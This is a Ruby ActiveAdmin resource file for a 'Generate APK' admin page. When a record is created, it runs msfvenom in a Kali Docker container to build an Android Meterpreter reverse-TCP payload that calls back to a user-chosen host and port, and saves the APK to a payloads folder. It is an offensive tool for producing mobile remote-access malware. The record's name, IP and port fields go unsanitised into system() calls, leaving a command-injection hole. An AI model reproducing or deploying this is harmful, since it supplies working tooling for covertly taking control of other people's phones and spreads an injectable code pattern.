ActiveAdmin.register ApkPayload do
  menu priority: 3, label: "Generate APK"
    

    after_create do |apk_payload|
        generateApkCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/msfvenom -p android/meterpreter/reverse_tcp " \
                            "LHOST=#{apk_payload.forwarding_ip} LPORT=#{apk_payload.forwarding_port}  R > /root/#{apk_payload.name}.apk\""
        copyApkCommand="docker cp kali_container:/root/#{apk_payload.name}.apk payloads\\#{apk_payload.name}.apk"
        puts generateApkCommand
        puts copyApkCommand
        system(generateApkCommand)
        system(copyApkCommand)
        
    end

  # See permitted parameters documentation:
  # https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters
  #
  # Uncomment all parameters which should be permitted for assignment
  #
   permit_params :destination_ip, :destination_port, :forwarding_ip, :forwarding_port, :name
  #
  # or
  #
  # permit_params do
  #   permitted = [:destination_ip, :destination_port, :forwarding_ip, :forwarding_port]
  #   permitted << :other if params[:action] == 'create' && current_user.admin?
  #   permitted
  # end
  
end
